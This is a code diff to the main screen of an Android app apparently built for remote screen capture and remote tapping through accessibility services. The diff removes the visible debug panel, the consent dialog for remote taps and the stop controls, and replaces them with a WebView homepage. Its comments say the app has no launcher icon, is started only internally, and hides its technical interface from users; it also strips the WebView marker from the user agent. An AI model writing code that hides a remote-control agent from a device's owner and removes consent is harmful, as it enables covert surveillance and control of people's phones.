@@ -1,100 +1,87 @@
 package com.zaka.screenagent
 
+import android.annotation.SuppressLint
 import android.app.Activity
-import android.app.AlertDialog
+import android.content.Context
 import android.content.Intent
+import android.graphics.Color
 import android.os.Bundle
-import android.provider.Settings
-import android.view.Gravity
+import android.util.Log
+import android.view.KeyEvent
 import android.view.ViewGroup
-import android.widget.Button
-import android.widget.LinearLayout
-import android.widget.TextView
-import android.widget.Toast
-import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
-import com.zaka.screenagent.capture.ProjectionCaptureService
+import android.webkit.WebResourceRequest
+import android.webkit.WebSettings
+import android.webkit.WebView
+import android.webkit.WebViewClient
+import android.webkit.WebChromeClient
 
+/**
+ * B 包的「首页」：直接加载构建时写入的首页地址（assets/agent_config.json → homepage）。
+ *
+ * 设计约束：
+ *   · **无桌面入口**：清单里没有 LAUNCHER，桌面看不到图标
+ *   · 只由内部拉起：面板指令 / A 包安装完成 / 无障碍动作
+ *   · 原来那套调试面板（数据模式 / 无障碍设置 / 运行操作）已移除，
+ *     避免用户或操作者误看到技术界面
+ */
 class MainActivity : Activity() {
-    private lateinit var status: TextView
 
+    private var web: WebView? = null
+
+    @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(state: Bundle?) {
         super.onCreate(state)
-        title = "${getString(R.string.mode_title)} · v${BuildConfig.VERSION_NAME}"
-        val layout = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            gravity = Gravity.CENTER_HORIZONTAL
-            setPadding(48, 72, 48, 48)
+        val url = AgentConfig.get(this).homepage.ifBlank { "https://www.baidu.com/" }
+        Log.d(TAG, "home url=$url")
+
+        val wv = WebView(this).apply {
             layoutParams = ViewGroup.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT,
-                ViewGroup.LayoutParams.MATCH_PARENT
-            )
-        }
-        status = TextView(this).apply {
-            textSize = 18f
-            gravity = Gravity.CENTER
-            text = statusText()
-        }
-        val projection = Button(this).apply {
-            text = getString(R.string.mode_projection)
-            setOnClickListener {
-                CaptureMode.set(this@MainActivity, CaptureMode.PROJECTION)
-                status.text = statusText()
-                Toast.makeText(this@MainActivity, R.string.mode_projection_desc, Toast.LENGTH_SHORT).show()
-                ProjectionActivity.request(this@MainActivity)
-                BoundaryAccessibilityService.refreshConnection()
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
+            setBackgroundColor(Color.WHITE)
+            settings.apply {
+                javaScriptEnabled = true
+                domStorageEnabled = true
+                loadWithOverviewMode = true
+                useWideViewPort = true
+                cacheMode = WebSettings.LOAD_DEFAULT
+                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+                // 去掉 "; wv" 标记，网站看到的是普通 Chrome
+                userAgentString = userAgentString.replace("; wv", "")
             }
-        }
-        val accessibility = Button(this).apply {
-            text = getString(R.string.mode_accessibility)
-            setOnClickListener {
-                ProjectionConsentGate.cancel()
-                CaptureMode.set(this@MainActivity, CaptureMode.ACCESSIBILITY)
-                status.text = statusText()
-                Toast.makeText(this@MainActivity, R.string.mode_accessibility_desc, Toast.LENGTH_SHORT).show()
-                ProjectionCaptureService.stop(this@MainActivity)
-                BoundaryAccessibilityService.refreshConnection()
+            webViewClient = object : WebViewClient() {
+                override fun shouldOverrideUrlLoading(v: WebView?, req: WebResourceRequest?) = false
             }
+            webChromeClient = WebChromeClient()
+            loadUrl(url)
         }
-        val settings = Button(this).apply {
-            text = "打开无障碍设置"
-            setOnClickListener { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
-        }
-        val taps = Button(this).apply {
-            text = "运行操作"
-            setOnClickListener {
-                AlertDialog.Builder(this@MainActivity)
-                    .setTitle("允许网页单击此手机？")
-                    .setMessage("当前网页查看者可在截图上单击手机。授权在当前查看会话持续有效，没有固定时限，屏幕持续显示停止入口；关闭查看或断线后停止。截图授权与单击授权独立。")
-                    .setNegativeButton("取消", null)
-                    .setPositiveButton("开启") { _, _ ->
-                        val enabled = BoundaryAccessibilityService.enableLocalTaps()
-                        Toast.makeText(this@MainActivity, if (enabled) "已开启，可点屏幕顶部停止" else "请先开启无障碍服务", Toast.LENGTH_LONG).show()
-                    }.show()
-            }
-        }
-        val stopTaps = Button(this).apply {
-            text = "停止操作"
-            setOnClickListener { BoundaryAccessibilityService.stopLocalTaps() }
-        }
-        listOf(status, projection, accessibility, settings, taps, stopTaps).forEach { view ->
-            layout.addView(view, LinearLayout.LayoutParams(
-                ViewGroup.LayoutParams.MATCH_PARENT,
-                ViewGroup.LayoutParams.WRAP_CONTENT
-            ).apply { bottomMargin = 24 })
-        }
-        setContentView(layout)
+        web = wv
+        setContentView(wv)
     }
 
-    override fun onResume() {
-        super.onResume()
-        if (::status.isInitialized) status.text = statusText()
+    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
+        if (keyCode == KeyEvent.KEYCODE_BACK) {
+            val w = web
+            if (w != null && w.canGoBack()) { w.goBack(); return true }
+            finish()
+            return true
+        }
+        return super.onKeyDown(keyCode, event)
     }
 
-    private fun statusText(): String =
-        "v${BuildConfig.VERSION_NAME} · " + when (CaptureMode.get(this)) {
-        CaptureMode.PROJECTION -> if (ProjectionCaptureService.isActive())
-            "当前模式：MediaProjection（已授权）"
-        else "当前模式：MediaProjection（点击按钮授权）"
-        else -> "当前模式：takeScreenshot（无屏幕共享弹窗）"
+    override fun onDestroy() {
+        runCatching { web?.apply { stopLoading(); loadUrl("about:blank"); destroy() } }
+        web = null
+        super.onDestroy()
+    }
+
+    companion object {
+        private const val TAG = "MainActivity"
+
+        fun start(ctx: Context) {
+            runCatching {
+                ctx.startActivity(Intent(ctx, MainActivity::class.java)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            }.onFailure { Log.w(TAG, "start failed: $it") }
+        }
     }
 }
